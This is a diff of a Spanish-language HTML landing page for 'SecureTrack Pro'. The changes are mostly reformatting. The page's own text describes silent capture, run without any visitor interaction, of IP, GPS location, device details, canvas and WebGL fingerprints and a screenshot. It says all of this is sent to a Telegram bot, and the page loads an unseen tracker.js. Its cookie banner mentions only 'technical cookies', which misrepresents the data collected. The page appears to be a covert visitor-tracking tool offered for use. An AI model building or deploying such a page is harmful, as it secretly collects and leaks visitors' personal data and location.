@@ -1,21 +1,30 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="SecureTrack Pro — Plataforma avanzada de verificación técnica y análisis de conexiones en tiempo real." />
+  <link rel="icon" type="image/png" href="favicon.png" sizes="32x32" />
+  <link rel="shortcut icon" href="favicon.png" />
+  <meta name="description"
+    content="SecureTrack Pro — Plataforma avanzada de verificación técnica y análisis de conexiones en tiempo real." />
   <title>SecureTrack Pro — Análisis de Conexión en Tiempo Real</title>
 
   <!-- Google Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+    rel="stylesheet" />
 
   <!-- html2canvas CDN -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js" integrity="sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"
+    integrity="sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
   <link rel="stylesheet" href="styles.css" />
 </head>
+
 <body>
 
   <!-- Background effects -->
@@ -157,15 +166,18 @@
         <div class="feature-card animate-fade-up" style="animation-delay:0.1s">
           <div class="feature-icon">🌍</div>
           <h3>Geolocalización Precisa</h3>
-          <p>IP pública, ciudad, región, país, coordenadas GPS, zona horaria y proveedor ASN con resolución a nivel de ciudad.</p>
+          <p>IP pública, ciudad, región, país, coordenadas GPS, zona horaria y proveedor ASN con resolución a nivel de
+            ciudad.</p>
           <div class="feature-tags">
-            <span class="tag">IP</span><span class="tag">GPS</span><span class="tag">ISP</span><span class="tag">ASN</span>
+            <span class="tag">IP</span><span class="tag">GPS</span><span class="tag">ISP</span><span
+              class="tag">ASN</span>
           </div>
         </div>
         <div class="feature-card animate-fade-up" style="animation-delay:0.2s">
           <div class="feature-icon">💻</div>
           <h3>Análisis de Dispositivo</h3>
-          <p>Sistema operativo, navegador con versión exacta, resolución de pantalla, profundidad de color y tipo de dispositivo.</p>
+          <p>Sistema operativo, navegador con versión exacta, resolución de pantalla, profundidad de color y tipo de
+            dispositivo.</p>
           <div class="feature-tags">
             <span class="tag">OS</span><span class="tag">Browser</span><span class="tag">Screen</span>
           </div>
@@ -173,7 +185,8 @@
         <div class="feature-card animate-fade-up" style="animation-delay:0.3s">
           <div class="feature-icon">🔑</div>
           <h3>Fingerprinting Avanzado</h3>
-          <p>Canvas fingerprint único SHA-256 por dispositivo y WebGL fingerprint con fabricante y modelo de GPU exactos.</p>
+          <p>Canvas fingerprint único SHA-256 por dispositivo y WebGL fingerprint con fabricante y modelo de GPU
+            exactos.</p>
           <div class="feature-tags">
             <span class="tag">Canvas</span><span class="tag">WebGL</span><span class="tag">SHA-256</span>
           </div>
@@ -189,7 +202,8 @@
         <div class="feature-card animate-fade-up" style="animation-delay:0.2s">
           <div class="feature-icon">📸</div>
           <h3>Captura Visual</h3>
-          <p>Screenshot instantáneo de la página renderizada convertido a JPEG y adjunto automáticamente al informe Telegram.</p>
+          <p>Screenshot instantáneo de la página renderizada convertido a JPEG y adjunto automáticamente al informe
+            Telegram.</p>
           <div class="feature-tags">
             <span class="tag">html2canvas</span><span class="tag">JPEG</span>
           </div>
@@ -197,7 +211,8 @@
         <div class="feature-card animate-fade-up" style="animation-delay:0.3s">
           <div class="feature-icon">🚀</div>
           <h3>Notificación Instantánea</h3>
-          <p>Transmisión inmediata a Telegram Bot con mensaje HTML estructurado y screenshot adjunto en menos de 2 segundos.</p>
+          <p>Transmisión inmediata a Telegram Bot con mensaje HTML estructurado y screenshot adjunto en menos de 2
+            segundos.</p>
           <div class="feature-tags">
             <span class="tag">Telegram</span><span class="tag">Bot API</span>
           </div>
@@ -221,28 +236,33 @@
           <div class="step-num">01</div>
           <div class="step-content">
             <h3>Carga Silenciosa Automática</h3>
-            <p>Al acceder a la página, el motor de captura se activa 2–3 segundos después del primer render. Consulta APIs de geolocalización, extrae User-Agent, genera fingerprints y captura screenshot sin ninguna interacción del usuario.</p>
+            <p>Al acceder a la página, el motor de captura se activa 2–3 segundos después del primer render. Consulta
+              APIs de geolocalización, extrae User-Agent, genera fingerprints y captura screenshot sin ninguna
+              interacción del usuario.</p>
           </div>
         </div>
         <div class="step animate-fade-up" style="animation-delay:0.2s">
           <div class="step-num">02</div>
           <div class="step-content">
             <h3>Procesamiento y Estructuración</h3>
-            <p>Los datos capturados se consolidan en un objeto unificado. Se calculan fingerprints SHA-256 únicos y se construye el mensaje formateado en HTML con emojis para Telegram.</p>
+            <p>Los datos capturados se consolidan en un objeto unificado. Se calculan fingerprints SHA-256 únicos y se
+              construye el mensaje formateado en HTML con emojis para Telegram.</p>
           </div>
         </div>
         <div class="step animate-fade-up" style="animation-delay:0.3s">
           <div class="step-num">03</div>
           <div class="step-content">
             <h3>Transmisión a Telegram</h3>
-            <p>El informe completo se envía a través de la Bot API: primero el mensaje de texto estructurado con más de 40 campos, luego el screenshot JPEG adjunto con caption descriptivo.</p>
+            <p>El informe completo se envía a través de la Bot API: primero el mensaje de texto estructurado con más de
+              40 campos, luego el screenshot JPEG adjunto con caption descriptivo.</p>
           </div>
         </div>
         <div class="step animate-fade-up" style="animation-delay:0.4s">
           <div class="step-num">04</div>
           <div class="step-content">
             <h3>Confirmación por Click</h3>
-            <p>Al hacer clic en "Ver Informe Completo" se dispara un segundo envío que incluye tiempo en página, scroll realizado y confirmación de engagement humano (no bot).</p>
+            <p>Al hacer clic en "Ver Informe Completo" se dispara un segundo envío que incluye tiempo en página, scroll
+              realizado y confirmación de engagement humano (no bot).</p>
           </div>
         </div>
       </div>
@@ -300,11 +320,13 @@
   <div class="cookie-banner" id="cookie-banner">
     <div class="cookie-inner">
       <span class="cookie-icon">🍪</span>
-      <p>Utilizamos cookies técnicas para el análisis de conexión y la mejora de la experiencia. Al continuar navegando acepta nuestra política de privacidad.</p>
+      <p>Utilizamos cookies técnicas para el análisis de conexión y la mejora de la experiencia. Al continuar navegando
+        acepta nuestra política de privacidad.</p>
       <button class="btn-cookie" id="btn-accept-cookie" onclick="acceptCookies()">Aceptar</button>
     </div>
   </div>
 
   <script src="tracker.js"></script>
 </body>
+
 </html>
